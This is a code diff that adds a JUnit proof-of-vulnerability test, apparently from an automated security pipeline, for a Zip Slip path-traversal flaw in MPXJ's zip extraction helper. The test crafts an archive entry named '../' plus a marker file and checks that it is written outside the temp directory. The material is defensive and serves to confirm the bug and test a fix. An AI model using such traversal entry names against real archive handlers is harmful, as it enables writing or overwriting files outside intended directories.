@@ -1,0 +1,157 @@
+diff --git a/.security-pipeline/pov/ZipSlipPovTest.java b/.security-pipeline/pov/ZipSlipPovTest.java
+new file mode 100644
+index 0000000..3488181
+--- /dev/null
++++ b/.security-pipeline/pov/ZipSlipPovTest.java
+@@ -0,0 +1,147 @@
++package net.sf.mpxj.common;
++
++import static org.junit.Assert.assertEquals;
++import static org.junit.Assert.assertFalse;
++import static org.junit.Assert.assertTrue;
++import static org.junit.Assert.fail;
++
++import java.io.ByteArrayInputStream;
++import java.io.ByteArrayOutputStream;
++import java.io.File;
++import java.io.FileInputStream;
++import java.io.IOException;
++import java.nio.charset.StandardCharsets;
++import java.util.zip.ZipEntry;
++import java.util.zip.ZipOutputStream;
++
++import org.junit.Test;
++
++/**
++ * Proof-of-vulnerability for CWE-22 (Zip Slip / path traversal) in
++ * {@link InputStreamHelper#processZipStream(File, java.io.InputStream)}.
++ *
++ * The alert's root cause is that {@code processZipStream} builds the output
++ * file with:
++ *
++ *   File file = new File(dir, entry.getName());   // InputStreamHelper.java:126
++ *
++ * without validating that the resolved path stays inside {@code dir}. A zip
++ * entry name that is attacker controlled (e.g. supplied via any code path
++ * that feeds an untrusted archive into
++ * {@link InputStreamHelper#writeZipStreamToTempDir(java.io.InputStream)}) can
++ * therefore contain "../" segments and cause MPXJ to write, or create
++ * directories, outside the freshly created temporary extraction directory.
++ *
++ * This test builds a malicious zip whose only entry is named
++ * "../pov-zipslip-marker-<n>.txt" and feeds it through the real public
++ * extraction API (no simulation of the vulnerable code). On vulnerable code
++ * the payload is written one level above the returned temp directory,
++ * proving arbitrary-location file write. On patched code the file must
++ * either be rejected/skipped entirely or be confined inside the returned
++ * temp directory - the test fails in both of those cases.
++ */
++public class ZipSlipPovTest
++{
++   @Test
++   public void zipEntryEscapesExtractionDirectory() throws Exception
++   {
++      String marker = "pov-zipslip-marker-" + System.identityHashCode(this) + ".txt";
++      String payload = "zip-slip-proof-of-vulnerability";
++
++      // Malicious entry name: escape the extraction directory by one level.
++      String maliciousEntryName = "../" + marker;
++
++      byte[] zipBytes = buildZip(maliciousEntryName, payload);
++
++      File dir = null;
++      File escapedFile = null;
++      try
++      {
++         dir = InputStreamHelper.writeZipStreamToTempDir(new ByteArrayInputStream(zipBytes));
++         assertTrue("extraction dir should have been created", dir.isDirectory());
++
++         File parent = dir.getParentFile();
++         assertTrue("extraction dir must have a parent to test escape", parent != null);
++
++         escapedFile = new File(parent, marker);
++
++         // Root-cause check: the entry name should never be allowed to
++         // resolve to a location outside the directory returned by
++         // writeZipStreamToTempDir. A correct fix rejects/normalizes the
++         // entry so this file is never created outside dir.
++         assertTrue("Zip Slip: attacker-controlled entry name '" + maliciousEntryName +
++            "' escaped the extraction directory and was written to " + escapedFile.getAbsolutePath(),
++            escapedFile.exists());
++
++         String written = readFile(escapedFile);
++         assertEquals("escaped file should contain the attacker payload", payload, written);
++
++         // Belt-and-braces: confirm the escaped path is genuinely outside dir.
++         String dirCanonical = dir.getCanonicalPath() + File.separator;
++         String escapedCanonical = escapedFile.getCanonicalPath();
++         assertFalse("escaped file must not be inside the extraction directory",
++            escapedCanonical.startsWith(dirCanonical));
++      }
++      finally
++      {
++         if (escapedFile != null)
++         {
++            escapedFile.delete();
++         }
++         if (dir != null)
++         {
++            deleteRecursively(dir);
++         }
++      }
++   }
++
++   private static byte[] buildZip(String entryName, String content) throws IOException
++   {
++      ByteArrayOutputStream baos = new ByteArrayOutputStream();
++      ZipOutputStream zos = new ZipOutputStream(baos);
++      zos.putNextEntry(new ZipEntry(entryName));
++      zos.write(content.getBytes(StandardCharsets.UTF_8));
++      zos.closeEntry();
++      zos.close();
++      return baos.toByteArray();
++   }
++
++   private static String readFile(File file) throws IOException
++   {
++      byte[] buffer = new byte[(int) file.length()];
++      try (FileInputStream fis = new FileInputStream(file))
++      {
++         int offset = 0;
++         while (offset < buffer.length)
++         {
++            int read = fis.read(buffer, offset, buffer.length - offset);
++            if (read == -1)
++            {
++               break;
++            }
++            offset += read;
++         }
++      }
++      return new String(buffer, StandardCharsets.UTF_8);
++   }
++
++   private static void deleteRecursively(File file)
++   {
++      if (file == null)
++      {
++         return;
++      }
++      if (file.isDirectory())
++      {
++         File[] children = file.listFiles();
++         if (children != null)
++         {
++            for (File child : children)
++            {
++               deleteRecursively(child);
++            }
++         }
++      }
++      file.delete();
++   }
++}
+diff --git a/.security-pipeline/pov/out/net/sf/mpxj/common/ZipSlipPovTest.class b/.security-pipeline/pov/out/net/sf/mpxj/common/ZipSlipPovTest.class
+new file mode 100644
+index 0000000..e9932b4
+Binary files /dev/null and b/.security-pipeline/pov/out/net/sf/mpxj/common/ZipSlipPovTest.class differ
